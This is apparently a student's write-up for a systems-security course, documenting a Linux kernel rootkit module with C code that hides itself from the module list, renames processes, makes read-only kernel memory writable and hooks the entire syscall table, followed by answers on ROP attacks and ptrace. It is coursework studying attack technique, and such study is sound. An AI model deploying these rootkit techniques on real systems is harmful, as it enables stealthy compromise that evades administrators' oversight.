# SSDI Assignment 1 Write Up

## Hide/Unhide Module (10%)

### Idea

The Linux kernel maintains a list of all loaded modules, which can be displayed using the `lsmod` command. To prevent `lsmod` from revealing the rootkit, we remove the rootkit from the module list.

### Implementation

The macro `THIS_MODULE`, defined in `<linux/export.h>`, provides a pointer to the current module. It is of type `struct module`, which is defined in `<linux/module.h>`:

```c
struct module {

    /* Member of list of modules */
    struct list_head list;

    /* Unique handle for this module */
    char name[MODULE_NAME_LEN];
    
    /* ... */
};
```

This structure contains the list node `list`, which links the module into the module list. By removing the rootkit from this list, we hide it, and by reinserting it, we make it visible again. We use Kprobes to obtain the module list head, allowing us to reinsert the rootkit later. 

We can not store references to the previous or next module when removing the rootkit, as they may be removed while the rootkit is hidden, preventing reinsertion. 

Additionally, we must call `try_module_get()` before removing the rootkit to prevent it from being unloaded. Otherwise, the kernel may automatically unload it. After reinserting, we call `module_put()` to allow it to be removed properly.

```c
static bool module_hidden = false;
struct list_head *modules = NULL; // Obtained via kprobe

static void toggle_module_visibility(void) {
    if (!module_hidden) {
        try_module_get(THIS_MODULE); // Prevent unloading
        // Hide module: remove from list
        list_del(&THIS_MODULE->list);
        module_hidden = true;
        
        printk(KERN_INFO "Module hidden\n");
    } else {
        list_add_tail(&THIS_MODULE->list, modules);
        module_hidden = false;
        module_put(THIS_MODULE); // Balance reference count

        printk(KERN_INFO "Module unhidden\n");
    }
}
```

### Test

In `test.sh`:
1.	Verify that the module is visible.
2.	Call `toggle_module_visibility` to change the module’s visibility.
3.	Verify that the module is now hidden.
4.	Call `toggle_module_visibility` again.
5.	Verify that the module becomes visible again.

## Masquerade Process Name (30%)

### Idea

We iterate over all processes using the `for_each_process()` macro, modifying the `comm` field of the target process based on the given request.

### Implementation

Since we need to allow userspace to pass a pointer to the kernel space, we modify `rootkit.h` such that `IOCTL_MOD_MASQ` uses `_IOW` to accept a `struct masq_proc_req *` parameter:

```c
#define IOCTL_MOD_MASQ _IOW(MAGIC, 1, struct masq_proc_req)
```

Next, we copy data from the user space pointer to kernel space and modify the process name accordingly.

```c
static void masquerade_proc(struct masq_proc *proc) {
    struct task_struct *task;
    char *new_name = proc->new_name;
    char *orig_name = proc->orig_name;

    // new name must be shorter than original name
    if (strnlen(new_name, MASQ_LEN) >= strnlen(orig_name, MASQ_LEN)) {
        return;
    }

    // iterate over all processes and masquerade name if possible
    for_each_process(task) {
        if (strcmp(task->comm, orig_name) == 0) {
            strcpy(task->comm, new_name);
        }
    }
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg) {
    switch (ioctl) {
    case IOCTL_MOD_MASQ:
        struct masq_proc_req req;
        struct masq_proc *procs;

        // copy request from user space
        if (copy_from_user(&req, (void *)arg, sizeof(req))) {
            ret = -EFAULT;
            break;
        }

        // allocate memory for procs
        procs = kmalloc(req.len * sizeof(struct masq_proc), GFP_KERNEL);
        if (!procs) {
            ret = -ENOMEM;
            break;
        }

        // copy procs from user space
        if (copy_from_user(procs, req.list, req.len * sizeof(struct masq_proc))) {
            kfree(procs);
            ret = -EFAULT;
            break;
        }

        // masquerade each process
        for (int i = 0; i < req.len; i++) {
            masquerade_proc(&procs[i]);
        }

        kfree(procs);
        break;
    }
}
```

### Test

In test.sh:
1.	Start an instance of vim.
2.	Call `masquerade` to change the **vim** process name to **vi**.
3.	Verify that the process name has changed.
4.	Start another instance of vim.
5.	Call `masquerade` to change the **vim** process name to **omg**.
6.	Verify that the newly started vim process remains unchanged.

## Filter Syscall (40%)

### Idea

Our ultimate goal is to replace all original syscall handlers with our custom syscall handler. In this custom handler, we check the syscall number and process name. If they match a given filter, we block the syscall and return an error code. Otherwise, we invoke the original handler.

#### Prerequisites
1.	Obtain the memory address of the syscall table.
2.	Make `.rodata` writable, since the syscall table is located there.

We first use Kprobes to obtain the function `kallsyms_lookup_name()`, which retrieves kernel global variable addresses. With this function, we retrieve the memory addresses of the syscall table, `.rodata`, and the function that modifies memory permissions. Finally, after making `.rodata` writable, we can modify the syscall table to replace the original handlers with our custom handlers.

### Enabling Kprobes

By default, Kprobes is disabled. Recompile the kernel to enable it:

```sh
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig
# Enable features for Kprobes
scripts/config --enable CONFIG_KPROBES
scripts/config --enable CONFIG_KPROBE_EVENTS
make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- -j$(nproc)
```

### Implementation

1. Use Kprobes to obtain the memory address of `kallsyms_lookup_name()`. Kprobes is primarily used to monitor function calls and is triggered whenever the function executes. Since we only need the function address `.addr`, we unregister the Kprobe after retrieving the address.
	```c
	unsigned long (*__kallsyms_lookup_name)(const char *);
    static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
    };

    static int get_kallsyms_lookup_name(void) {
		int ret = register_kprobe(&kp);
		if (ret < 0) {
			pr_err("register_kprobe failed, returned %d\n", ret);
			return ret;
		}
		__kallsyms_lookup_name = (void*)kp.addr;
		unregister_kprobe(&kp);
		return 0;
	}
    ```
2. Use `kallsyms_lookup_name()` to find the memory addresses of kernel global variables. Our goal is to find `sys_call_table`, as well as the start (`__start_rodata`) and end (`__init_begin`) addresses of the `.rodata` section, and the function `update_mapping_prot()` that modifies memory permissions.
    ```c
    unsigned long (*__kallsyms_lookup_name)(const char *);
	static unsigned long *__sys_call_table = NULL;
	void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
	unsigned long start_rodata, init_begin;

    void resolve_symbol_addr(void) {
		__sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
		update_mapping_prot = (void *)__kallsyms_lookup_name("update_mapping_prot");
		start_rodata = (unsigned long)__kallsyms_lookup_name("__start_rodata");
		init_begin = (unsigned long)__kallsyms_lookup_name("__init_begin");
	}
    ```

3. Since `sys_call_table` is located in the `.rodata` section of kernel memory, it is read-only by default. We define two functions that call `update_mapping_prot()` to modify the memory permission of `.rodata`.
	```c
    static inline void __mark_rodata_wr(void) {
		unsigned long section_size = init_begin - start_rodata;
		update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
					PAGE_KERNEL);
	}

	static inline void __mark_rodata_ro(void) {
		unsigned long section_size = init_begin - start_rodata;
		update_mapping_prot(__pa_symbol(start_rodata), start_rodata, section_size,
					PAGE_KERNEL_RO);
	}
    ```
4. Store the original syscall handlers that require filtering and replace them in `sys_call_table` with our custom handlers.
    ```c
    static sys_call_t orig_read;
	static sys_call_t orig_write;

    static asmlinkage long hooked_read(const struct pt_regs *regs) {
		// TODO
	}

	static asmlinkage long hooked_write(const struct pt_regs *regs) {
		// TODO
	}

    
	static int set_syscall_hook(void) {
		__mark_rodata_wr();

		orig_read = (sys_call_t)__sys_call_table[__NR_read];
		orig_write = (sys_call_t)__sys_call_table[__NR_write];
		__sys_call_table[__NR_read] = (unsigned long) &hooked_read;
		__sys_call_table[__NR_write] = (unsigned long) &hooked_write;

		__mark_rodata_ro();
		return 0;
	}

	static int remove_syscall_hook(void) {
		__mark_rodata_wr();

		__sys_call_table[__NR_read] = (unsigned long)orig_read;
		__sys_call_table[__NR_write] = (unsigned long)orig_write;

		__mark_rodata_ro();
		return 0;
	}

    ```

5. Define `struct filter` to store the process names and syscall numbers of restricted processes. Using `struct filter`, we decide whether to block a syscall and return an error code or call the original syscall handler. `filter_list` is used to store filters.
    ```c
    typedef struct filter {
		int syscall_nr;             // Syscall number
		char comm[TASK_FILTER_LEN]; // Process name
		struct list_head list;      // circular list
	} filter;

	static LIST_HEAD(filter_list);

    static asmlinkage long hooked_read(const struct pt_regs *regs) {
		filter *cur;
		struct task_struct *current_t;

		current_t = current;
		list_for_each_entry(cur, &filter_list, list) {
			if (strcmp(cur->comm, current_t->comm) == 0) {
				pr_info("filtered read from current_t->comm: %s\n", current_t->comm);
				return -EPERM;
			}
		}
		return orig_read(regs);
	}

	static asmlinkage long hooked_write(const struct pt_regs *regs) {
		filter *cur;
		struct task_struct *current_t;

		current_t = current;
		list_for_each_entry(cur, &filter_list, list) {
			if (strcmp(cur->comm, current_t->comm) == 0)
				return -EPERM;
		}
		return orig_write(regs);
	}
    ```
6. Add and remove filters to `filter_list`.
    ```c
	static int add_filter(struct filter_info *finfo) {
		int ret = 0;
		struct filter *filter;
		struct filter *cur;

		pr_info("%s: syscall_nr=%d, comm=%s\n", __func__, finfo->syscall_nr, finfo->comm);

		// check repeated filter
		list_for_each_entry(cur, &filter_list, list) {
			if (finfo->syscall_nr == cur->syscall_nr && strcmp(cur->comm, finfo->comm) == 0) {
				pr_err("add_filter: repeated filter\n");
				ret = -EINVAL; // error for identical elements
				return ret;
			}
		}

		filter = kmalloc(sizeof(struct filter), GFP_KERNEL);
		if (!filter) {
			pr_err("kmalloc: failed to allocate memory\n");
			ret = -ENOMEM;
			return ret;
		}

		strcpy(filter->comm, finfo->comm);
		filter->syscall_nr = finfo->syscall_nr;
		list_add_tail(&filter->list, &filter_list);

		return ret;
	}

	static int remove_filter (struct filter_info *finfo) {
		struct filter *cur;

		pr_info("%s: syscall_nr=%d, comm=%s\n", __func__, finfo->syscall_nr, finfo->comm);

		list_for_each_entry(cur, &filter_list, list) {
			if (finfo->syscall_nr == cur->syscall_nr && strcmp(cur->comm, finfo->comm) == 0) {
				list_del(&cur->list);
				kfree(cur);
				return 0;
			}
		}

		pr_err("%s: syscall_nr=%d, comm=%s not found\n", __func__, finfo->syscall_nr, finfo->comm);
		return -EFAULT;
	}

    
    static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                              unsigned long arg) {
        long ret = 0;
	    struct filter_info finfo;

        printk(KERN_INFO "%s\n", __func__);

        switch (ioctl) {
        case IOCTL_ADD_FILTER:
            struct filter_info info;
            if (copy_from_user(&finfo, (void *)arg, sizeof(struct filter_info))) {
                ret = -EFAULT;
                break;
            }
            ret = add_filter(&finfo);
            break;
        case IOCTL_REMOVE_FILTER:
            struct filter_info finfo;
            if (copy_from_user(&finfo, (void *)arg, sizeof(struct filter_info))) {
                ret = -EFAULT;
                break;
            }
            ret = remove_filter(&finfo)
            break;
        default:
            ret = -EINVAL;
        }
        return ret;
    }
    ```

7. Module initialization and memory cleanup on removal.
    ```c
	static int __init rootkit_init(void) {
		if (get_kallsyms_lookup_name()) {
			pr_err("failed to get kallsyms_lookup_name\n");
			return -EFAULT;
		}
		resolve_symbol_addr();
		if (set_syscall_hook()) {
			pr_err("failed to set syscall hook\n");
			return -EFAULT;
		}

		major = register_chrdev(0, OURMODNAME, &fops);
		if (major < 0) {
			pr_err("Registering char device failed with %d\n", major);
			return major;
		}

		pr_info("The module was assigned major number %d.\n", major);
		cls = class_create(THIS_MODULE, OURMODNAME);
		device_create(cls, NULL, MKDEV(major, 0), NULL, OURMODNAME);
		pr_info("Device created on /dev/%s\n", OURMODNAME);

		return 0;
	}

	static void __exit rootkit_exit(void) {
		struct filter *cur, *tmp;

		// unhook syscall
		remove_syscall_hook();
		pr_info("removed syscall hooks\n");
		
		// cleanup syscall filter list
		list_for_each_entry_safe(cur, tmp, &filter_list, list) {
			list_del(&cur->list);
			pr_info("removed filter syscall_nr=%d, comm=%s\n", cur->syscall_nr, cur->comm);
			kfree(cur);
		}
		pr_info("removed filter list\n");

		pr_info("%s: removed\n", OURMODNAME);
		device_destroy(cls, MKDEV(major, 0));
		class_destroy(cls);
		unregister_chrdev(major, OURMODNAME);
	}
    ```
8. To extend syscall filtering capabilities, we replace all syscall handlers in `sys_call_table` with `hooked_syscall()`, which can filter syscalls. In `hooked_syscall()`, we obtain process name via `(struct task_struct *) current` and syscall number via `regs->regs[8]`.
    ```c
    static asmlinkage long hooked_syscall(const struct pt_regs *regs) {
        struct filter *cur;
        struct task_struct *current_t;

        current_t = current;
        list_for_each_entry(cur, &filter_list, list) {
            if (regs->regs[8] == cur->syscall_nr && strcmp(cur->comm, current_t->comm) == 0) {
                return -EPERM;
            }
        }
        return orig_sys_call[regs->regs[8]](regs);
    }
    ```
    `static void *orig_sys_call[NR_syscalls]` stores original syscall handlers.
    ```c
    static sys_call_t orig_sys_call[NR_syscalls];\

    static int set_syscall_hook(void) {
        __mark_rodata_wr();

        for (int i = 0; i < NR_syscalls; i++) {
            if (i == __NR_delete_module) // do NOT modify delete_module()
                continue;
            orig_sys_call[i] = (sys_call_t)__sys_call_table[i];
            __sys_call_table[i] = (unsigned long) &hooked_syscall;
        }

        __mark_rodata_ro();
        return 0;
    }

    static int remove_syscall_hook(void) {
        __mark_rodata_wr();

        for (int i = 0; i < NR_syscalls; i++) {
            if (i == __NR_delete_module) // do NOT modify delete_module()
                continue;
            __sys_call_table[i] = (unsigned long) orig_sys_call[i];
        }

        __mark_rodata_ro();
        return 0;
    }
    ```
	
### Testing

In `test.sh`, program A (`syscall_filter`) is executed and calls program B(`check_open`) during the test. Following are what A does.

1. Verify that A can call `read()` and B can call `open()`.
2. Filter A's `read()` and B's `open()`.
3. `open()` Verify that A cannot call `read()` and B cannot call `open()`.
4. Unfilter A's `read()` and B's `open()`.
5. Verify that A can call `read()` and B can call `open()`.

## Others

### Synchronization

To avoid race condition we employ semaphore to synchronize module accesses.

```c
#include <linux/semaphore.h>

static DEFINE_SEMAPHORE(lock);

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
                          unsigned long arg) {
    long ret = 0;
    struct filter_info finfo;

    down(&lock);
    switch (ioctl) {
        // Handle requests
    }

    up(&lock);
    return ret;
}
```

## Questions
1. **Q :** The system call filtering based approach is vulnerable to the so called Returned Oriented Programming (ROP) attack, why is that? Name a concrete attack example in your write-up, and discuss approaches that you could use to address the vulnerabilities.

    
    **Ans :** Filtering system calls is done via modifying the system call handler in the system call entry to the desired one. However, ROP attack can pass the filtering by using other un-filtered system calls to achieve the same result. **Specifically, ROP attacks make use of gadgets in binary code and overflowing stacks to jump to specific code sequentially, achieving the result that attackers want.** For example, we could filter out `execve` to avoid opening shells; however, attackers could realize shell-opening by : 
    
    a. Use `mmap()` to allocate a page.
    b. Use `read()` to store a prepared shell code into the allocated memory.
    c. Use gadgets to jump to the shell code address for execution.

    To address the vulnerability in the example, we could enforce "Write XOR Execute", which means to limit all memory to only `write` or `execute`, but not both at the same time. In this way, even if the attacker could jump to specific memory address, the code cannot be executed.
    To further avoid ***all*** types of ROP attacks, we could make use of "shadow stacks", which are hardware-maintained stacks just for return addresses. Return addresses in current stack are compared to the value stored in shadow stacks. Under this situation, even if attackers overflow the current stack to manipulate return address, it could not change the control flow. 
    
2. **Q :** What are the advantages and disadvantages of the filtering approach served by the module in this assignment compared to an approach based on `ptrace` ?

    
    **Ans :** `ptrace` (process trace) is used for a process (usually a debugger like `gdb`) to monitor another. The tracer intercepts *every* system call of the target process and traps into user-space (back to the tracer), then decides on how to deal with the system call. 
    - ***Advantage of module***: 
        1. Less overhead : filtering is done in kernel space for the module approach; however, `ptrace` traps into user space, which leads to large context switch overhead.
        2. Finer control : kernel modules can directly hook to kernel functions without relying on external processes.
    - ***Disadvantage of module***: 
        1. Hard to debug : kernel-level code is harder to debug compared to user-level code.
        2. Portability : kernel module relies on specific kernel verions; `ptrace` works like a standard system call and can be ported on different systems.

## References

1. [x90613/Rootkit-LKM](https://github.com/x90613/Rootkit-LKM)
2. [The Linux Kernel API — The Linux Kernel documentation](https://docs.kernel.org/core-api/kernel-api.html)